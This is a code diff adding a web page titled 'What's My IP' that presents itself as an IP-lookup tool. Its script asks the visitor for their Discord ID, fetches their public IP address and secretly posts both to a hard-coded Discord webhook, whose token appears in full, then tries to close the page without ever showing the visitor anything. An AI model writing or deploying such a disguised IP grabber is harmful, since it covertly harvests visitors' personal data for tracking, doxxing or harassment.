@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>What's My IP</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      margin-top: 50px;
+    }
+  </style>
+</head>
+<body>
+  <script>
+    // Replace this with your Discord webhook URL
+    const webhookURL = 'https://discord.com/api/webhooks/1272569229044092948/pOYMbeqEFhUVrot8uP7c27SjHGLzgiM0JG0qwKHVfKhv3TmQ-ctkfyGlKyieyu00inC1';
+
+    // Prompt the user for their Discord ID
+    const discordID = prompt("Please enter your Discord ID:");
+
+    if (discordID) {
+      // Fetch the IP address from the API
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          // Send the IP address and Discord ID to the webhook
+          fetch(webhookURL, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              content: `User IP Address: ${data.ip}\nDiscord ID: ${discordID}`
+            })
+          }).then(() => {
+            // Attempt to close the site
+            window.open('', '_self', '');
+            window.close();
+          }).catch(error => {
+            console.error('Error sending to webhook:', error);
+          });
+        })
+        .catch(error => {
+          console.error('Error fetching IP:', error);
+        });
+    } else {
+      alert("Discord ID is required to proceed.");
+    }
+  </script>
+</body>
+</html>
